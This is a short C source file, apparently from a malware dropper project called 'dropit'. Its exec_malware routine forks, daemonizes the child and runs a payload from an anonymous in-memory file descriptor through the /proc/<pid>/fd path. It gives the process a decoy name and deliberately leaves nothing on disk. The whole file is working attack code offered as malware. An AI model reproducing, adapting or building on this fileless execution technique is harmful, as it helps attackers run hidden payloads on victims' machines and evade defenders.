#include "dropit.h"

static void exec_malware_ve(char *filename)
{
    pid_t   pid;

    char    *args[] = {
        "lolilol",
        NULL
    };

    if (!(pid = fork())) {
        if (daemon(0, 0) == -1) {
            perror(RED"Failed to daemonize :"WHITE);
            exit(EXIT_FAILURE);
        }
        if (execve(filename, args, __environ) == -1) {
            perror(RED"Failed to execute payload :"WHITE);
            exit(EXIT_FAILURE);
        }
    }
    else {
        wait(NULL);
        sleep(1); // Stay alive to let execve get the file before removing it from memory
    }
}

void        exec_malware(t_config config, int memfd)
{
    char    filename[32];
    
    snprintf(filename, 32, "/proc/%d/fd/%d", getpid(), memfd);
    if (config.exec_method == EXEC_VE)
        exec_malware_ve(filename);
}